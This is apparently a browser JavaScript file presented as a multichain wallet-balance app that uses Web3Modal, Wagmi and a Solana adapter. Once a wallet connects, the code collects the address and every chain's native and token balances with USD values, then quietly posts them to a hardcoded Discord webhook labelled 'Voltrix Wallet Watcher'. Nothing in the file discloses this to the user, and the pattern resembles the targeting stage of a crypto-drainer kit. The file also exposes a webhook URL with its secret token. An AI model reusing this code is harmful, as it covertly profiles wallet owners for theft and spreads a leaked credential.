// === Import Ethereum and Web3Modal Modules ===
import {
  EthereumClient,
  w3mConnectors,
  w3mProvider,
  WagmiCore,
  WagmiCoreChains,
  WagmiCoreConnectors
} from "https://unpkg.com/@web3modal/ethereum@2.6.2";
import { Web3Modal } from "https://unpkg.com/@web3modal/html@2.6.2";

// === Setup Ethereum ===
const {
  configureChains,
  createConfig,
  getAccount,
  fetchBalance,
  watchAccount
} = WagmiCore;

const chains = Object.values(WagmiCoreChains);
const projectId = "24cb4618162c124a24e58a917ab7cc45";
const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);

const wagmiConfig = createConfig({
  autoConnect: true,
  connectors: [
    ...w3mConnectors({ chains, version: 2, projectId }),
    new WagmiCoreConnectors.CoinbaseWalletConnector({
      chains,
      options: { appName: "Wallet MultiChain Balance" }
    }),
  ],
  publicClient,
});

const ethereumClient = new EthereumClient(wagmiConfig, chains);
const web3Modal = new Web3Modal({ projectId }, ethereumClient);

// === Solana Integration ===
import "https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js";
import "https://unpkg.com/@web3modal/solana@latest/dist/index.umd.js";

const solanaWallet = new window.Web3ModalSolana.SolanaWalletAdapter();

async function connectSolanaWallet() {
  try {
    await solanaWallet.connect();
    const publicKey = solanaWallet.publicKey.toString();
    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
    const balance = await connection.getBalance(solanaWallet.publicKey);
    const sol = balance / solanaWeb3.LAMPORTS_PER_SOL;

    const usdPrice = await getUSDPrice("solana");
    const usdValue = usdPrice ? (sol * usdPrice).toFixed(2) : null;

    await sendToDiscordEmbed({
      address: publicKey,
      nativeBalances: [{ chain: 'Solana', symbol: 'SOL', amount: sol.toFixed(6), usd: usdValue }],
      tokenSections: [] // You can fetch tokens via Solana indexers if needed
    });
  } catch (err) {
    console.error("Solana connect error:", err);
  }
}

// === Discord Webhook & Utility Functions ===
const webhookURL = "https://discord.com/api/webhooks/1364326652473114644/8fTaSHHEVBU1xJThC5V3xwAuXonQlwC3xwE0CJh0CoJ9l5RQmArpqJfzieQNHV23rMiR";

async function getUSDPrice(symbol) {
  try {
    const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${symbol.toLowerCase()}&vs_currencies=usd`);
    const data = await res.json();
    return data[symbol.toLowerCase()]?.usd || null;
  } catch {
    return null;
  }
}

async function sendToDiscordEmbed({ address, nativeBalances, tokenSections }) {
  const embed = {
    title: `\ud83d\udcbc Wallet Connected`,
    description: `**\ud83d\udc64 Wallet:** \`${address}\``,
    color: 0x00ffcc,
    fields: [
      {
        name: `\ud83d\udcb0 Native Balances`,
        value: nativeBalances.map(n => `**${n.chain}**: ${n.symbol} ${n.amount} ${n.usd ? `($${n.usd})` : ''}`).join('\n'),
        inline: false
      },
      ...tokenSections.map(section => ({
        name: `\ud83d\udcdc Tokens on ${section.chain}`,
        value: section.tokens.map(t => `- ${t.symbol}: ${t.amount} ${t.usd ? `($${t.usd})` : ""}`).join('\n'),
        inline: false
      }))
    ],
    footer: { text: `Voltrix Wallet Watcher` },
    timestamp: new Date().toISOString()
  };

  try {
    await fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds: [embed] })
    });
  } catch (err) {
    console.error("Failed to send embed", err);
  }
}

// === Ethereum Wallet Monitoring ===
async function sendBalancesToDiscord(account) {
  if (!account.isConnected) return;

  const address = account.address;
  const nativeBalances = [];
  const tokenSections = [];

  for (const chain of chains) {
    try {
      const chainId = chain.id;
      const chainName = chain.name;

      const nativeBalance = await fetchBalance({ address, chainId });
      const nativeAmount = parseFloat(nativeBalance.formatted).toFixed(6);
      const nativePrice = await getUSDPrice(nativeBalance.symbol);
      const nativeUSD = nativePrice ? (nativePrice * nativeAmount).toFixed(2) : null;

      nativeBalances.push({
        chain: chainName,
        symbol: nativeBalance.symbol,
        amount: nativeAmount,
        usd: nativeUSD
      });

      const { publicClient: chainClient } = configureChains([chain], [w3mProvider({ projectId })]);
      const tokensList = [];

      if (typeof chainClient.getTokenBalances === "function") {
        const tokens = await chainClient.getTokenBalances({ address });
        for (const token of tokens) {
          const amount = parseFloat(token.formatted);
          if (amount > 0) {
            const usdPrice = await getUSDPrice(token.symbol);
            tokensList.push({
              symbol: token.symbol,
              amount: amount.toFixed(6),
              usd: usdPrice ? (usdPrice * amount).toFixed(2) : null
            });
          }
        }
      }

      if (tokensList.length > 0) {
        tokenSections.push({ chain: chainName, tokens: tokensList });
      }
    } catch (err) {
      console.error(`Error fetching for ${chain.name}:`, err);
    }
  }

  await sendToDiscordEmbed({ address, nativeBalances, tokenSections });
}

// === Listeners ===
watchAccount((account) => {
  if (account.isConnected) {
    sendBalancesToDiscord(account);
  }
});

// Optional: Trigger Solana connect (use this on a button click or page load)
// connectSolanaWallet();
